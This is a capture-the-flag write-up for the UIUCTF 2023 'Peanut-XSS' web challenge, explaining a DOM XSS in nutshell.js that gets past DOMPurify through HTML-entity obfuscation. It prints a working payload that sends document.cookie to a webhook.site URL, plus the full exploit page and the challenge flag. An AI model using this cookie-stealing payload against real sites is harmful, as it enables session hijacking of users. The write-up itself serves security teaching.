# Peanut-XSS (UIUCTF 2023)

**Challenge category**: Web<br>
**Challenge description**: "Nutshell is pretty cool. Want to test it out?"<br>
**Challenge points**: 322<br>
**CTF date**: sab, 01 Lug. 2023, 00:00 UTC — lun, 03 Lug. 2023, 00:00 UTC<br>

## Context

This challenge is about a DOM XSS (and HTML obfuscation).

## Exploring the challenge

The only web page available uses <code>nutshell.js</code>, a tool used to create "expandable and embeddable explanations". This tool takes the specified HTML
inside the GET <code>nutshell</code> parameter and render all links starting with <code>:</code>. These links may refer to a Youtube video,
a section of a Wikipedia article or a section of any web page (even the same). To do this, the url specified in the <code>href</code> attribute must be of the following format: <code>http[s]?://domain_name/path#text</code>, where <code>text</code> is the text inside a section tag (<code><h\*></code>).
All the elements present in this section are shown inside the balloon produced.

![1](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/364d3adc-0c39-4743-a710-834dfdd3842d)

![2](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/dda8e0b1-8778-4ef7-ab3b-ad46a8a28358)

![3](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/f35b95c9-4ea8-4040-9697-bbe54f00409c)

A user can submit any URL to the admin bot. It doesn't fire any user events, so you need to define a possible XSS so that triggers automatically.

## Attack
The HTML defined inside the nutshell parameter goes through this code:
```javascript
const $ = document.querySelector.bind(document);
      const nutshell = new URLSearchParams(location.search).get("nutshell");
      if (nutshell) {
        preview.innerHTML = DOMPurify.sanitize(nutshell);
      } else {
        var editor = CodeMirror.fromTextArea($("#editor"), {
          mode: "HTMLmixed",
          lineNumbers: true
        });
        $("#submit").style.display = "";

        $("#submit").onclick = () => {
          location.search = `nutshell=${encodeURIComponent(editor.getValue())}`;
        };
      }
```
The HTML, before being parsed by nutshell.js, is DOMPurified.
Looking at the <code>nutshell.js</code>([[1]](#1)) we can see this piece of code:
```javascript
// Get an array of all links, filtered by if the text starts with a :colon
        let expandables = [...dom.querySelectorAll('a')].filter(
            link => (link.innerText.trim().indexOf(':')==0)
        );

        // Turn each one into an Expandable!
        expandables.forEach((ex)=>{

            // Style: closed Expandable
            ex.classList.add('nutshell-expandable');
            ex.setAttribute("mode", "closed");

            // Remove colon, replace with animated balls
            let linkText = document.createElement('span');
            linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(':')+1);
            linkText.className = 'nutshell-expandable-text';
            let ballUp = document.createElement('span');
            ballUp.className = 'nutshell-ball-up';
            let ballDown = document.createElement('span');
            ballDown.className = 'nutshell-ball-down';
            ex.innerHTML = '';
            ex.appendChild(linkText);
            ex.appendChild(ballUp);
            ex.appendChild(ballDown);
...
```
These instructions are executed as soon as the script loads, so without the user having to click the expandable link. Accepts the text specified after the colon
inside the anchor tag and paste it inside a <code>span</code> element with innerHTML. This element is then added to the page. This is the sink where the malicious code goes.<br>
We can't just define the malicious HTML inside the anchor tag for two reasons: the innerText only refers to the text and the HTML defined inside the nutshell parameter is
purified by DOM Purify from the page itself. We should define text that can be interpreted as HTML, but isn't HTML. How? Obfuscation!
To trigger an XSS, a code like this: <code>\</span\>\<img src onerror='fetch("https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/? cookie= "+document.cookie)'/\>\<span\></code> should be written like this:
<code>\&lt;/span\&gt;\&lt;img src onerror='fetch("<span>https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/?cookie=</span> "+document.cookie)'/\&gt;\&lt;span\&gt;</code>. It works because the innerText property decodes the escaped HTML into real HTML and from this output a string containing valid HTML is then obtained, which is then inserted into innerHTML. So:
```HTML
<HTML>
<body>
    <h2>To write a section,</h2>
    <p>just use headings & paragraphs like this! Then…</p>
    <h2>To embed a section,</h2>
    <p>just make a link with :colon at the front… <a href="#ToWriteASection">:&lt;/span&gt;&lt;img src onerror=&#39;fetch(&quot;https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b/?cookie=&quot;+document.cookie)&#39;/&gt;&lt;span&gt;</a>!</p>
</body>
</HTML>
```
If we click the preview button, the client is redirected to the same page but with the nutshell parameter containing the malicious HTML.
The XSS should be triggered. If we send the url of the page to the admin bot, we get its cookie (the flag).

![peanut_xss_flag](https://github.com/H31s3n-b3rg/CTF_Write-ups/assets/66698256/4a45e29f-728b-4ce3-9390-19aa51fafece)

Flag is <code>uiuctf{cr4ck1ng_0open_somE_nuTsh3lls}</code>

## References
<a id="1">[1]</a>
https://github.com/ncase/nutshell/blob/main/nutshell.js
